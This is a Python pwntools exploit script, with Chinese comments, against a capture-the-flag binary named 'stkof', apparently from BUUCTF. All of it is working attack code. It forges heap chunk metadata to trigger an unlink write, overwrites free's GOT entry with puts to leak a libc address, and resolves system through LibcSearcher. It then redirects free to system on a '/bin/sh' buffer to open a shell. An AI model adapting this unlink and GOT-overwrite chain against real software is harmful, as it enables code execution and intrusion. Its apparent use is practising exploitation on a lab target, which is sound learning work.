from pwn import *
from LibcSearcher import *

# 远程连接
p = process('./stkof')
# p = remote('node5.buuoj.cn', 25650)
context.log_level = 'info'
elf = ELF('./stkof')

# 地址定义
free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_plt = elf.plt['free']
bss_addr = 0x602100
chunk_addr = 0x602140

def add(size):
    p.recvuntil(b'OK\n')
    p.sendline(b'1')
    p.sendline(str(size).encode())

def edit(num, size, payload):
    p.recvuntil(b'OK\n')
    p.sendline(b'2')
    p.sendline(str(num).encode())
    p.sendline(str(size).encode())
    p.send(payload)

def delet(num):
    p.recvuntil(b'OK\n')
    p.sendline(b'3')
    p.sendline(str(num).encode())

# 初始分配
p.sendline(b'1')
p.sendline(b'24')               # 第一个块（printf 的 buf，作用不大）
add(128)                          # 块 A，下标 2
gdb.attach(p)
add(128)                          # 块 B，下标 3
add(128)                          # 块 C，下标 4
add(128)                          # 块 D，下标 5

aim = chunk_addr + 0x10           # 指向 bss 上的指针数组

# 构造 payload 修改块 A 的内容，伪造块 B 的 prev_size 和 size
# 使得块 B 认为前一个块（A）是空闲的，并在 free(B) 时触发 unlink
pl1 = (
    p64(0) + p64(0x81) +           # prev_size, size
    p64(aim - 0x18) + p64(aim - 0x10) +  # FD, BK
    b'a' * 0x60 +                   # 填充
    p64(0x80) + b'\x90'              # 修改 B 的 prev_size 和 size 的 inuse 位
)

edit(2, len(pl1), pl1)              # 修改块 A

# 释放块 B，触发 unlink
delet(3)

# 现在可以修改 bss 上的指针数组
pl2 = b'a' * 8 + p64(free_got) + p64(puts_got)   # 修改 s[0] = free_got, s[1] = puts_got
edit(2, len(pl2), pl2)

# 修改 s[0]（即 free_got）的内容为 puts_plt
pl3 = p64(puts_plt)
edit(0, len(pl3), pl3)              # 此时 free 变成了 puts

delet(1)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('puts_addr ==> ' + hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

log.success('libc_base ==> ' + hex(libc_base))
log.success('system_addr ==> ' + hex(system_addr))
log.success('bin_sh_addr ==> ' + hex(bin_sh_addr))

pl4 = p64(system_addr)
edit(0, len(pl4), pl4)

pl5 = b'/bin/sh\x00'
edit(2, len(pl5), pl5)

delet(2)

p.interactive()